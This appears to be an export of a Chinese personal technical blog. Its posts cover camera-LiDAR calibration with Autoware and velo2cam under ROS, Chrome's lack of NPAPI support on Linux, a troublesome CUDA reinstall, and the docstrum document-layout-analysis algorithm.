<h3 id="3-1-autoware-camera-lidar-calibrator"><a href="#3-1-autoware-camera-lidar-calibrator" class="headerlink" title="3.1. autoware_camera_lidar_calibrator"></a>3.1. autoware_camera_lidar_calibrator</h3><p><strong>（1）标定</strong><br>使用这个工具要安装完整的<a href="https://github.com/CPFL/Autoware">Autoware</a>，使用方法在这：<a href="https://blog.csdn.net/learning_tortosie/article/details/82347694">https://blog.csdn.net/learning_tortosie/article/details/82347694</a> 。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 启动 velodyne（也可以直接从Autoware的Sensing面板打开）</span><br><span class="line">roslaunch velodyne_pointcloud VLP16_points.launch calibration:&#x3D;&#x2F;home&#x2F;s1nh&#x2F;project&#x2F;SLAM&#x2F;velodyne&#x2F;VLP-16.yaml</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 启动小觅相机</span><br><span class="line">source ~&#x2F;project&#x2F;SLAM&#x2F;mynt-eye-sdk-2-updated&#x2F;wrappers&#x2F;ros&#x2F;devel&#x2F;setup.bash</span><br><span class="line">roslaunch mynt_eye_ros_wrapper mynteye.launch</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">启动标定程序</span><br><span class="line">roslaunch autoware_camera_lidar_calibrator camera_lidar_calibration.launch intrinsics_file:&#x3D;&#x2F;home&#x2F;s1nh&#x2F;20190215_1853_autoware_camera_calibration.yaml image_src:&#x3D;&#x2F;mynteye&#x2F;left&#x2F;image_raw</span><br></pre></td></tr></table></figure>

<p><strong>（2）验证</strong><br>需要注意的是，标定完以后，在Autoware的Sensing面板中使用<code>Calibration Publisher</code> 和 <code>Points Image</code> 查看标定结果的时候（下图），总会出现错误<code>[ERROR] [1550575174.074463696]: [calibration_publisher] Missing calibration file path &#39;&#39;.</code></p>
<p><img src="http://qiniu.s1nh.org/autoware_sensing_calib.png-QNthin"></p>
<p>估计是个Bug，因此我直接运行了下面命令绕过了这个Bug：</p>
<p>打开三个终端，分别执行下面三段代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source Autoware&#x2F;ros&#x2F;devel&#x2F;setup.bash</span><br><span class="line">roslaunch velodyne_pointcloud velodyne_vlp16.launch calibration:&#x3D;&#x2F;home&#x2F;s1nh&#x2F;project&#x2F;SLAM&#x2F;velodyne&#x2F;VLP-16.yaml</span><br><span class="line"></span><br><span class="line"># 注意，velodyne教程中的方法：</span><br><span class="line"># roslaunch velodyne_pointcloud VLP16_points.launch calibration:&#x3D;&#x2F;home&#x2F;s1nh&#x2F;project&#x2F;SLAM&#x2F;velodyne&#x2F;VLP-16.yaml</span><br><span class="line"># roslaunch velodyne_pointcloud 32e_points.launch calibration:&#x3D;&#x2F;home&#x2F;s1nh&#x2F;project&#x2F;SLAM&#x2F;velodyne&#x2F;VLP-16.yaml</span><br><span class="line"># 都奇迹般的不能用，只能通过autoware的velodyne_vlp16.launch才可以正常使用</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source Autoware&#x2F;ros&#x2F;devel&#x2F;setup.bash</span><br><span class="line">roslaunch src&#x2F;util&#x2F;packages&#x2F;runtime_manager&#x2F;scripts&#x2F;calibration_publisher.launch file:&#x3D;&#x2F;home&#x2F;s1nh&#x2F;20190215_200018_autoware_lidar_camera_calibration.yaml image_topic_src:&#x3D;&#x2F;mynteye&#x2F;left&#x2F;image_raw</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source Autoware&#x2F;ros&#x2F;devel&#x2F;setup.bash</span><br><span class="line">rosrun points2image points2image</span><br></pre></td></tr></table></figure>

<p>执行完毕后，打开rviz，选择<code>Panels</code> –&gt; <code>Add New Panel</code> –&gt; <code>ImageViewerPlugin</code>，然后在新窗口中选好<code>Image Topic</code>和<code>Point Topic</code>即可</p>
<p><img src="http://qiniu.s1nh.org/autoware_imageviewerplugin.png-QNthin"></p>
<h3 id="3-2-velo2cam-calibration"><a href="#3-2-velo2cam-calibration" class="headerlink" title="3.2. velo2cam_calibration"></a>3.2. velo2cam_calibration</h3><blockquote>
<p>上面的工具采用手工选择9个点来实现标定，看起来不是很fancy。velo2cam 可以通过一个特制的标定板进行全自动标定</p>
</blockquote>
<p><strong>(1) 测试</strong></p>
<p>velo2cam编译起来很快，但是官方文档没有列出dependence，记得安装好<code>ros-kinetic-opencv-apps</code> <code>ros-kinetic-stereo-image-proc</code> 这两个包，否则运行时会出现如下错误：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[ERROR] [1550561705.487407242]: Failed to load nodelet [&#x2F;stereo_camera&#x2F;disparity] of type [stereo_image_proc&#x2F;disparity] even after refreshing the cache: According to the loaded plugin descriptions the class stereo_image_proc&#x2F;disparity with base class type nodelet::Nodelet does not exist. Declared types are  adding_images&#x2F;adding_images camshift&#x2F;camshift contour_moments&#x2F;contour_moments convex_hull&#x2F;convex_hull corner_harris&#x2F;corner_harris discrete_fourier_transform&#x2F;discrete_fourier_transform edge_detection&#x2F;edge_detection face_detection&#x2F;face_detection face_recognition&#x2F;face_recognition fback_flow&#x2F;fback_flow find_contours&#x2F;find_contours general_contours&#x2F;general_contours goodfeature_track&#x2F;goodfeature_track gscam&#x2F;GSCamNodelet hls_color_filter&#x2F;hls_color_filter hough_circles&#x2F;hough_circles hough_lines&#x2F;hough_lines hsv_color_filter&#x2F;hsv_color_filter image_view&#x2F;disparity image_view&#x2F;image imu_filter_madgwick&#x2F;ImuFilterNodelet jsk_topic_tools&#x2F;Block jsk_topic_tools&#x2F;DeprecatedRelay jsk_topic_tools&#x2F;HzMeasure jsk_topic_tools&#x2F;LightweightThrottle jsk_topic_tools&#x2F;MUX jsk_topic_tools&#x2F;Passthrough jsk_topic_tools&#x2F;Relay jsk_topic_tools&#x2F;Snapshot jsk_topic_tools&#x2F;StealthRelay jsk_topic_tools&#x2F;StringRelay jsk_topic_tools&#x2F;SynchronizedThrottle jsk_topic_tools&#x2F;VitalCheckerNodelet jsk_topic_tools_test&#x2F;LogUtils lk_flow&#x2F;lk_flow nodelet_tutorial_math&#x2F;Plus opencv_apps&#x2F;adding_images opencv_apps&#x2F;camshift opencv_apps&#x2F;contour_moments opencv_apps&#x2F;convex_hull opencv_apps&#x2F;corner_harris opencv_apps&#x2F;discrete_fourier_transform opencv_apps&#x2F;edge_detection opencv_apps&#x2F;face_detection opencv_apps&#x2F;face_recognition opencv_apps&#x2F;fback_flow opencv_apps&#x2F;find_contours opencv_apps&#x2F;general_contours opencv_apps&#x2F;goodfeature_track opencv_apps&#x2F;hls_color_filter opencv_apps&#x2F;hough_circles opencv_apps&#x2F;hough_lines opencv_apps&#x2F;hsv_color_filter opencv_apps&#x2F;lk_flow opencv_apps&#x2F;people_detect opencv_apps&#x2F;phase_corr opencv_apps&#x2F;pyramids opencv_apps&#x2F;rgb_color_filter opencv_apps&#x2F;segment_objects opencv_apps&#x2F;simple_compressed_example opencv_apps&#x2F;simple_example opencv_apps&#x2F;simple_flow opencv_apps&#x2F;smoothing opencv_apps&#x2F;threshold opencv_apps&#x2F;watershed_segmentation pcl&#x2F;BAGReader pcl&#x2F;BoundaryEstimation pcl&#x2F;ConvexHull2D pcl&#x2F;CropBox pcl&#x2F;EuclideanClusterExtraction pcl&#x2F;ExtractIndices pcl&#x2F;ExtractPolygonalPrismData pcl&#x2F;FPFHEstimation pcl&#x2F;FPFHEstimationOMP pcl&#x2F;MomentInvariantsEstimation pcl&#x2F;MovingLeastSquares pcl&#x2F;NodeletDEMUX pcl&#x2F;NodeletMUX pcl&#x2F;NormalEstimation pcl&#x2F;NormalEstimationOMP pcl&#x2F;NormalEstimationTBB pcl&#x2F;PCDReader pcl&#x2F;PCDWriter pcl&#x2F;PFHEstimation pcl&#x2F;PassThrough pcl&#x2F;PointCloudConcatenateDataSynchronizer pcl&#x2F;PointCloudConcatenateFieldsSynchronizer pcl&#x2F;PrincipalCurvaturesEstimation pcl&#x2F;ProjectInliers pcl&#x2F;RadiusOutlierRemoval pcl&#x2F;SACSegmentation pcl&#x2F;SACSegmentationFromNormals pcl&#x2F;SHOTEstimation pcl&#x2F;SHOTEstimationOMP pcl&#x2F;SegmentDifferences pcl&#x2F;StatisticalOutlierRemoval pcl&#x2F;VFHEstimation pcl&#x2F;VoxelGrid people_detect&#x2F;people_detect phase_corr&#x2F;phase_corr pyramids&#x2F;pyramids rgb_color_filter&#x2F;rgb_color_filter segment_objects&#x2F;segment_objects simple_compressed_example&#x2F;simple_compressed_example simple_example&#x2F;simple_example simple_flow&#x2F;simple_flow smoothing&#x2F;smoothing threshold&#x2F;threshold velodyne_driver&#x2F;DriverNodelet velodyne_laserscan&#x2F;LaserScanNodelet velodyne_pointcloud&#x2F;CloudNodelet velodyne_pointcloud&#x2F;RingColorsNodelet velodyne_pointcloud&#x2F;TransformNodelet watershed_segmentation&#x2F;watershed_segmentation</span><br><span class="line">[ERROR] [1550561705.488020647]: The error before refreshing the cache was: According to the loaded plugin descriptions the class stereo_image_proc&#x2F;disparity with base class type nodelet::Nodelet does not exist. Declared types are  adding_images&#x2F;adding_images camshift&#x2F;camshift contour_moments&#x2F;contour_moments convex_hull&#x2F;convex_hull corner_harris&#x2F;corner_harris discrete_fourier_transform&#x2F;discrete_fourier_transform edge_detection&#x2F;edge_detection face_detection&#x2F;face_detection face_recognition&#x2F;face_recognition fback_flow&#x2F;fback_flow find_contours&#x2F;find_contours general_contours&#x2F;general_contours goodfeature_track&#x2F;goodfeature_track gscam&#x2F;GSCamNodelet hls_color_filter&#x2F;hls_color_filter hough_circles&#x2F;hough_circles hough_lines&#x2F;hough_lines hsv_color_filter&#x2F;hsv_color_filter image_view&#x2F;disparity image_view&#x2F;image imu_filter_madgwick&#x2F;ImuFilterNodelet jsk_topic_tools&#x2F;Block jsk_topic_tools&#x2F;DeprecatedRelay jsk_topic_tools&#x2F;HzMeasure jsk_topic_tools&#x2F;LightweightThrottle jsk_topic_tools&#x2F;MUX jsk_topic_tools&#x2F;Passthrough jsk_topic_tools&#x2F;Relay jsk_topic_tools&#x2F;Snapshot jsk_topic_tools&#x2F;StealthRelay jsk_topic_tools&#x2F;StringRelay jsk_topic_tools&#x2F;SynchronizedThrottle jsk_topic_tools&#x2F;VitalCheckerNodelet jsk_topic_tools_test&#x2F;LogUtils lk_flow&#x2F;lk_flow nodelet_tutorial_math&#x2F;Plus opencv_apps&#x2F;adding_images opencv_apps&#x2F;camshift opencv_apps&#x2F;contour_moments opencv_apps&#x2F;convex_hull opencv_apps&#x2F;corner_harris opencv_apps&#x2F;discrete_fourier_transform opencv_apps&#x2F;edge_detection opencv_apps&#x2F;face_detection opencv_apps&#x2F;face_recognition opencv_apps&#x2F;fback_flow opencv_apps&#x2F;find_contours opencv_apps&#x2F;general_contours opencv_apps&#x2F;goodfeature_track opencv_apps&#x2F;hls_color_filter opencv_apps&#x2F;hough_circles opencv_apps&#x2F;hough_lines opencv_apps&#x2F;hsv_color_filter opencv_apps&#x2F;lk_flow opencv_apps&#x2F;people_detect opencv_apps&#x2F;phase_corr opencv_apps&#x2F;pyramids opencv_apps&#x2F;rgb_color_filter opencv_apps&#x2F;segment_objects opencv_apps&#x2F;simple_compressed_example opencv_apps&#x2F;simple_example opencv_apps&#x2F;simple_flow opencv_apps&#x2F;smoothing opencv_apps&#x2F;threshold opencv_apps&#x2F;watershed_segmentation pcl&#x2F;BAGReader pcl&#x2F;BoundaryEstimation pcl&#x2F;ConvexHull2D pcl&#x2F;CropBox pcl&#x2F;EuclideanClusterExtraction pcl&#x2F;ExtractIndices pcl&#x2F;ExtractPolygonalPrismData pcl&#x2F;FPFHEstimation pcl&#x2F;FPFHEstimationOMP pcl&#x2F;MomentInvariantsEstimation pcl&#x2F;MovingLeastSquares pcl&#x2F;NodeletDEMUX pcl&#x2F;NodeletMUX pcl&#x2F;NormalEstimation pcl&#x2F;NormalEstimationOMP pcl&#x2F;NormalEstimationTBB pcl&#x2F;PCDReader pcl&#x2F;PCDWriter pcl&#x2F;PFHEstimation pcl&#x2F;PassThrough pcl&#x2F;PointCloudConcatenateDataSynchronizer pcl&#x2F;PointCloudConcatenateFieldsSynchronizer pcl&#x2F;PrincipalCurvaturesEstimation pcl&#x2F;ProjectInliers pcl&#x2F;RadiusOutlierRemoval pcl&#x2F;SACSegmentation pcl&#x2F;SACSegmentationFromNormals pcl&#x2F;SHOTEstimation pcl&#x2F;SHOTEstimationOMP pcl&#x2F;SegmentDifferences pcl&#x2F;StatisticalOutlierRemoval pcl&#x2F;VFHEstimation pcl&#x2F;VoxelGrid people_detect&#x2F;people_detect phase_corr&#x2F;phase_corr pyramids&#x2F;pyramids rgb_color_filter&#x2F;rgb_color_filter segment_objects&#x2F;segment_objects simple_compressed_example&#x2F;simple_compressed_example simple_example&#x2F;simple_example simple_flow&#x2F;simple_flow smoothing&#x2F;smoothing threshold&#x2F;threshold velodyne_driver&#x2F;DriverNodelet velodyne_laserscan&#x2F;LaserScanNodelet velodyne_pointcloud&#x2F;CloudNodelet velodyne_pointcloud&#x2F;RingColorsNodelet velodyne_pointcloud&#x2F;TransformNodelet watershed_segmentation&#x2F;watershed_segmentation</span><br><span class="line">[FATAL] [1550561705.488279617]: Failed to load nodelet &#39;&#x2F;stereo_camera&#x2F;disparity&#96; of type &#96;stereo_image_proc&#x2F;disparity&#96; to manager &#96;stereo_manager&#39;</span><br></pre></td></tr></table></figure>

<p>很简单的跑一下官方的bag，就可以显示以下标定结果：</p>
<p><img src="http://qiniu.s1nh.org/velo2cam_rviz.png-QNthin"></p>
<p><strong>(2) 真机</strong></p>
<ol>
<li>使用 kalibr 标定小觅左右目的内参 ；</li>
<li>使用 image_undistort 发布去畸变的 image_rect 图像（千万不要尝试采用小觅相机自带SDK来获得 image_rect ）；</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 双目</span><br><span class="line">roslaunch &#x2F;home&#x2F;s1nh&#x2F;project&#x2F;SLAM&#x2F;MYNT-EYE-S-SDK&#x2F;wrappers&#x2F;ros&#x2F;src&#x2F;mynt_eye_ros_wrapper&#x2F;launch&#x2F;mynteye.launch</span><br><span class="line">roslaunch &#x2F;home&#x2F;s1nh&#x2F;catkin_ws&#x2F;src&#x2F;image_undistort&#x2F;launch&#x2F;stereo_undistort.launch</span><br><span class="line">roslaunch &#x2F;home&#x2F;s1nh&#x2F;catkin_ws&#x2F;src&#x2F;velo2cam_calibration&#x2F;launch&#x2F;real_stereo_pattern.launch</span><br><span class="line"></span><br><span class="line"># Velodyne</span><br><span class="line">roslaunch velodyne_pointcloud VLP16_points.launch calibration:&#x3D;&#x2F;home&#x2F;s1nh&#x2F;project&#x2F;SLAM&#x2F;velodyne&#x2F;VLP-16.yaml</span><br><span class="line">roslaunch &#x2F;home&#x2F;s1nh&#x2F;catkin_ws&#x2F;src&#x2F;velo2cam_calibration&#x2F;launch&#x2F;real_laser_pattern.launch</span><br><span class="line"></span><br><span class="line"># 标定</span><br><span class="line">roslaunch velo2cam_calibration velo2cam_calibration.launch</span><br></pre></td></tr></table></figure>

<p>一边调算法，一边跟小觅相机和它狗日的驱动作斗争。动不动就会出下面酱紫的错误：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 错误1:</span><br><span class="line">[mynteye&#x2F;mynteye_wrapper_node-2] process has died [pid 26183, exit code -11, cmd &#x2F;home&#x2F;s1nh&#x2F;project&#x2F;SLAM&#x2F;MYNT-EYE-S-SDK&#x2F;wrappers&#x2F;ros&#x2F;devel&#x2F;lib&#x2F;mynt_eye_ros_wrapper&#x2F;mynteye_wrapper_node __name:&#x3D;mynteye_wrapper_node __log:&#x3D;&#x2F;home&#x2F;s1nh&#x2F;.ros&#x2F;log&#x2F;1326b704-38e2-11e9-88d1-f01898375fa7&#x2F;mynteye-mynteye_wrapper_node-2.log].</span><br><span class="line">log file: &#x2F;home&#x2F;s1nh&#x2F;.ros&#x2F;log&#x2F;1326b704-38e2-11e9-88d1-f01898375fa7&#x2F;mynteye-mynteye_wrapper_node-2*.log</span><br><span class="line"></span><br><span class="line"># 错误2:</span><br><span class="line">W&#x2F;uvc-v4l2.cc:414 poll failed: v4l2 get stream time out, Try to reboot!</span><br><span class="line">W&#x2F;uvc-v4l2.cc:414 poll failed: v4l2 get stream time out, Try to reboot!</span><br><span class="line">W&#x2F;uvc-v4l2.cc:414 poll failed: v4l2 get stream time out, Try to reboot!</span><br><span class="line">W&#x2F;uvc-v4l2.cc:414 poll failed: v4l2 get stream time out, Try to reboot!</span><br><span class="line">W&#x2F;uvc-v4l2.cc:414 poll failed: v4l2 get stream time out, Try to reboot!</span><br></pre></td></tr></table></figure>

<h2 id="0xFF-其它破事"><a href="#0xFF-其它破事" class="headerlink" title="0xFF 其它破事"></a>0xFF 其它破事</h2><ol>
<li>Velodyne 的 GPS 时间戳同步失败</li>
</ol>
<p>Velodyne 时间同步需要 PPS 和 GPRMC 信号，其中PPS需要TTL电平，GPRMC需要RS232电平。然而，自带U里的用户手册写着GPRMC信号为TTL电平，因此调试了一下午才找到问题所在。</p>
<p>具体表现在，即使只有PPS信号，配置网页中也会显示已经Locked，但是抓包<code>UDP 8308</code>端口不会有时间戳显示。</p>
]]></content>
      <categories>
        <category>SLAM</category>
      </categories>
  </entry>
  <entry>
    <title>Chrome Linux 不支持npapi</title>
    <url>/post/chrome-not-support-npapi-in-linux/</url>
    <content><![CDATA[<p>Hikvision的web摄像头界面需要npapi的支持。<code>Chrome42</code>之前的版本都不支Npapi，<code>Chrome42~45</code>可以通过<code>chrome://flags/#enable-npapi</code>开启支持，<code>Chrome45</code>之后的版本不支持Npapi。</p>
<p>花了很久的时间找到了低版本的Chrome安装包，安装完以后依然无法执行插件。</p>
<p>仔细查阅文档后，发现<strong>只有Mac和Windows的Chrome对NPAPI提供支持</strong>。</p>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
      <tags>
        <tag>HIKVISION</tag>
        <tag>npapi</tag>
      </tags>
  </entry>
  <entry>
    <title>重新安装Cuda碰到了超级大坑</title>
    <url>/post/cuda-reinstall/</url>
    <content><![CDATA[<blockquote>
<p>本文其实就是为了炫耀一下我买的新玩具，地球人X411</p>
</blockquote>
<p><img src="http://qiniu.s1nh.org/Blog_cuda_01.jpg-QNthin"></p>
<span id="more"></span>

<p>为了更方便的用cuda，买了一台新笔电，配置i7-6700HQ+GTX970M。</p>
<p><img src="http://qiniu.s1nh.org/Blog_cuda_02.jpg-QNthin"></p>
<h2 id="莫名其妙的原因不支持-4-0-以上内核"><a href="#莫名其妙的原因不支持-4-0-以上内核" class="headerlink" title="莫名其妙的原因不支持 4.0 以上内核"></a>莫名其妙的原因不支持 4.0 以上内核</h2><p>之前我一直用一个移动固态硬盘装了<code>Ubuntu-14.04</code>，<code>cuda7.5</code>的工作环境。很单纯的以为像以前一样插到USB3.0开机就可以用了，结果<code>kernel 3.13</code>识别不了<strong>无线网卡</strong>（Mac Mini的无线网卡也无法识别，可是之前一直用有线就没在意）。<code>apt-get</code> 升级到 <code>kernel 4.2/4.4</code>都无法开机，grub引导后识别不到硬盘的<code>UUID</code>（废寝忘食的折腾了很久，最后还是失败了）。</p>
<p><img src="http://qiniu.s1nh.org/Blog_cuda_04.jpg-QNthin"></p>
<p>好吧，重装系统（大坑开始了）</p>
<h2 id="显卡太牛逼，nouveu驱动不兼容"><a href="#显卡太牛逼，nouveu驱动不兼容" class="headerlink" title="显卡太牛逼，nouveu驱动不兼容"></a>显卡太牛逼，nouveu驱动不兼容</h2><p>像以前一样装完<strong>ubuntu 14.04</strong>，无法开机（第一次碰到装完系统无法开机的情况）。又下了个<strong>ubuntu 16.04</strong>和<strong>Debian 8.5</strong> 依、然、无、法、开机😂😂😂……点亮以后，卡在开机画面不动，风扇呼呼响😂😂</p>
<p>查了一下debug，发现nouveu什么什么鬼载入不了（不记得具体内容了），就百度了一下，好像nouveu是个开源的驱动，可是对新设备兼容性不好。教程都说先把N卡拔下来，然后开机装好驱动再插上。可是笔记本并不能拔下来，BIOS里面也没有设置选项😂😂😂😂。我是通过以下方法禁用nouveu的：</p>
<ol>
<li>在Live CD中创建<code>/etc/modprobe.d/blacklist-nouveau.conf</code>，内容如下<br><code>blacklist nouveau options nouveau modeset=0</code></li>
<li>重新生成 kernel initramfs: <code>sudo update-initramfs -u</code></li>
</ol>
<h2 id="Cuda-版本对内核的兼容性"><a href="#Cuda-版本对内核的兼容性" class="headerlink" title="Cuda 版本对内核的兼容性"></a>Cuda 版本对内核的兼容性</h2><p>我是用官方的deb包装的cuda，顺利的装完以后，预料之中的<strong>又无法开机了</strong>，这下直接懵逼了，都不知道昨晚是怎么过来的。（开机以后卡在Ubuntu那不动，按啥键都不管用，风扇也不狂吹了，感觉是挂了。可是系统能响应<code>Ctr+Alt+Del</code>，按后过一会能重新启动😂😂）</p>
<p>去官网喵了一眼，发现<code>Cuda8.0</code>居然发布了，支持<code>Ubuntu16</code>。发布页面最后跟着一行小字“For further information, see the <a href="https://developer.nvidia.com/compute/cuda/8.0/rc/docs/sidebar/CUDA_Installation_Guide_Linux-pdf">Installation Guide for Linux</a>”。卧槽，我一直为官网的安装说明就下面这三行字：</p>
<p><img src="http://qiniu.s1nh.org/Blog_cuda_05.png-QNthin"></p>
<p>点开<strong>Installation Guide</strong>后，一切问题原来都不需要瞎百度、瞎折腾。安装说明写得很清楚什么时候需要<code>Disable Nouveau</code>，还有Cuda对各个Kernel依赖库的兼容性，并且<code>cuda 7.5</code>只支持<code>Kernel 3.13</code>😂😂😂</p>
<p><img src="http://qiniu.s1nh.org/Blog_cuda_04.jpg-QNthin"></p>
<p>这个故事告诉我们，遇到问题之前要<strong>先-去-看-官-方-文-档</strong></p>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
      <tags>
        <tag>Cuda</tag>
      </tags>
  </entry>
  <entry>
    <title>文档布局分析 &amp; 扭曲文档图像恢复 --- Document Layout Analysis &amp; Document Image Dewarping</title>
    <url>/post/document-layout-analysis/</url>
    <content><![CDATA[<!--
> 不知道各位有没有碰到过这种同事，经常一遇到问题就找你帮忙。等你坑赤坑赤花了几个小时在这个问题上，甚至已经帮他解决了问题的时候，他悠悠的来一句问题已经搞定了不麻烦你了；
> 还有另一种同事，你跟他结对编程，他只做自己擅长的部分，剩下擦屁股的工作都丢给你，出去宣扬这个部分都是他做的好累呀，出了问题背锅的总是你；
> 偏偏最近我就跟这种人合作，真是头疼。消消气，还是有容乃大为好。
-->
<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>对文本进行OCR前，必须分析和定义文档的逻辑结构。 例如文本块、段落、行的位置；是否有应该重建的表格；是否有“图像”“条形码等”。</p>
<p>文档布局分析 (Document Layout Analysis) 是识别和分类文本文档的扫描图像中的感兴趣区域（RoI, Regions of Interest) 的过程。阅读系统需要从非文本区域分割文本区域，并按正确的阅读顺序排列。将文本正文，插图，数学符号和嵌入文档中的表格等不同区域（或块）的检测和标记称为<strong>几何布局分析</strong>。但文本区域在文档中扮演不同的逻辑角色（标题，标题，脚注等），这种语义标记是<strong>逻辑布局分析</strong>的范围。</p>
<p>文档布局分析是几何和逻辑标签的结合。它通常在将文档图像发送到OCR引擎之前执行，但也可用于检测大型存档中同一文档的重复副本，或者通过其结构或图示内容索引文档。</p>
<p><img src="http://qiniu.s1nh.org/Blog_fr-editable-copy-result.png" title="Document Layout Analysis"></p>
<span id="more"></span>

<h2 id="0x01-最早的算法实现-docstrum"><a href="#0x01-最早的算法实现-docstrum" class="headerlink" title="0x01 最早的算法实现 docstrum"></a>0x01 最早的算法实现 docstrum</h2><p>1993年，<strong>O’ Gorman</strong> 在<strong>TPAMI</strong>中发表了自下而上的文档布局分析算法<code>docstrum</code>，首先将文档解析为黑白连接区域，然后将这些区域分组为单词，然后分为文本行，最后分组为文本块。</p>
<p>简单翻译了一下它的算法（<a href="https://en.wikipedia.org/wiki/Document_layout_analysis">english version</a>）：</p>
<blockquote>
<p>算法开始的字母代表着原始论文中每小节的标题序号。原始论文中，每个小节的标题如下：</p>
</blockquote>
<ul>
<li>B. Preprocessing</li>
<li>C. Nearest-Neighbor Clustering and Docstrum Plot</li>
<li>D. Spacing and Initial Orientation Estimation</li>
<li>E. Determination of Text Lines and Accurate Orientation Measurement</li>
<li>F. Structural Block Determination</li>
<li>G. Filtering</li>
<li>H. Global and Local Lay-out Analysis</li>
</ul>
<ol>
<li><code>B</code> 预处理图像以去除<strong>高斯噪声</strong>和<strong>椒盐噪声</strong>。<em>（某些噪声消除滤波器可能会将逗号和句号视为噪声，因此必须小心谨慎）</em></li>
<li><code>B</code> 将图像<strong>二值化</strong></li>
<li><code>B</code> 将图像分割为黑色像素的<strong>连通分量（下文称 Symbol）</strong>。对于每个Symbol，计算边框和质心（bounding box, centroid）。</li>
<li><code>C</code> 对于每个Symbol，确定其k近邻，且k&gt;=4。<em>（ O’Gorman在他的论文中建议将k = 5作为鲁棒性和速度之间的良好折衷。使用至少k = 4的原因是对于文档中的符号，两个或三个最接近的符号是在相同文本行上紧邻的那些符号。第四最近的符号通常在正上方或下方的一条线上，并且在下面的最近邻居计算中包括这些符号是很重要的。）</em></li>
<li><code>C</code> 每个Symbol的近邻对与两者质心的向量相关。如果为每对最近邻Symbol绘制这些向量，则可以得到文档的<strong>docstrum</strong>（下图）。通过来自水平的角度θ和两个最近邻居符号之间的距离D，创建<strong>最近邻角</strong>和<strong>最近邻距离直方图</strong>。</li>
<li><code>D</code> 使用最近邻角度直方图，可以计算文档的歪斜。如果歪斜较小，则继续下一步。如果不是，旋转图像以消除歪斜并返回<em>步骤3</em>。</li>
<li><code>D</code> 最近邻距离直方图具有若干峰值，并且这些峰值通常表示<strong>字符间间距</strong>，<strong>字间间距</strong>和<strong>行间间隔</strong>（between-character, between-word, between-line）。</li>
<li><code>D</code> 标记每个Symbol较远的邻居，该距离在<strong>between-character</strong>或<strong>between-word</strong>的某个容差内。对于标记的每个最近邻居符号，绘制连接其质心的线段。</li>
<li><code>E</code> 通过线段连接到其邻居的符号形成<strong>文本行</strong>。对于文本行中的所有质心，可以使用线性回归计算表示文本行的<strong>实际线段</strong>。（使用<strong>线性回归</strong>，是因为文本行中Symbol的所有质心都不太可能是共线的。）</li>
<li><code>F</code> 对于每对文本行，可以计算它们对应的线段之间的最小距离。如果该距离在步骤7中计算的行间间隔的某个容差内，则将两个文本行分组到相同的<strong>文本块</strong>中。</li>
<li>最后，可以为每个文本块计算<strong>边界框</strong>，并完成文档布局分析。<br><img src="http://qiniu.s1nh.org/Blog_docstrum_00.png" alt="docstrum"></li>
</ol>
<h2 id="0x02-实验"><a href="#0x02-实验" class="headerlink" title="0x02 实验"></a>0x02 实验</h2><h3 id="1-两个开源代码"><a href="#1-两个开源代码" class="headerlink" title="1. 两个开源代码"></a>1. 两个开源代码</h3><p><a href="https://github.com/chadoliver/cosc428-structor">https://github.com/chadoliver/cosc428-structor</a> 复现了docstrum<br><a href="https://github.com/chulwoopack/docstrum">https://github.com/chulwoopack/docstrum</a> 对前一个开源代码进行了优化</p>
<h3 id="2-复现"><a href="#2-复现" class="headerlink" title="2. 复现"></a>2. 复现</h3><blockquote>
<p>上面两段开源代码比较古老且有点乱，基于最新的opencv应该可以很快的复现docstrum</p>
</blockquote>
<p><img src="http://qiniu.s1nh.org/Blog_docstrum_1.png" alt="image.png"></p>
<h2 id="0x03-进展"><a href="#0x03-进展" class="headerlink" title="0x03 进展"></a>0x03 进展</h2><blockquote>
<p>没来得及看的一些文章</p>
</blockquote>
<ul>
<li><p><code>60多页</code> Cattoni, Roldano, et al. “Geometric layout analysis techniques for document image understanding: a review.” ITC-irst Technical Report 9703.09 (1998).</p>
</li>
<li><p><a href="https://www.researchgate.net/profile/Faisal_Shafait/publication/226110361_Coupled_snakelets_for_curled_text-line_segmentation_from_warped_document_images/links/542358fe0cf26120b7a6c334.pdf">[IJDAR 2013]</a> Bukhari, S. S., Shafait, F., &amp; Breuel, T. M.  Coupled snakelets for curled text-line segmentation from warped document images</p>
<img src="http://qiniu.s1nh.org/Blog_docstrum_2.png" width="600"></li>
<li><p><a href="https://www.researchgate.net/profile/Thomas_Breuel/publication/5431819_Performance_Evaluation_and_Benchmarking_of_Six-Page_Segmentation_Algorithms/links/551dd6dd0cf213ef063eb1ee.pdf">[TPAMI 2008]</a> Shafait, F., Keysers, D., &amp; Breuel, T. Performance evaluation and benchmarking of six-page segmentation algorithms </p>
<img src="http://qiniu.s1nh.org/Blog_docstrum_3.png" width="600"></li>
<li><p><a href="https://pdfs.semanticscholar.org/aa39/21e3a2eda4dd91c89f601ca9ae502f1e65e3.pdf">ICIAR 2014</a> Kassis, M., Kurar, B., Cohen, R., El-Sana, J., &amp; Kedem, K. Using Scale-Space Anisotropic Smoothing for Text Line Extraction in Historical Documents.</p>
<img src="http://qiniu.s1nh.org/Blog_docstrum_6.png" width="700"></li>
<li><p><a href="http://www.iapr-tc11.org/archive/das2012/attachments/FullPaperProceedings/4661a394.pdf">DAS 2012</a> Afzal, M. Z., Kramer, M., Bukhari, S. S., Shafait, F., &amp; Breuel, T. M.  Improvements to uncalibrated feature-based stereo matching for document images by using text-line segmentation</p>
<img src="http://qiniu.s1nh.org/Blog_docstrum_4.png" width="500"></li>
<li><p><a href="http://www.dfki.de/~bukhari/data/papers/29-Bukhari-Generic-Textline-Extraction-ICDAR13.pdf">ICDAR 2013</a>Bukhari, S. S., Shafait, F., &amp; Breuel, T. M. (2013, August). Towards generic text-line extraction.</p>
<img src="http://qiniu.s1nh.org/Blog_docstrum_5.png" width="400"></li>
</ul>
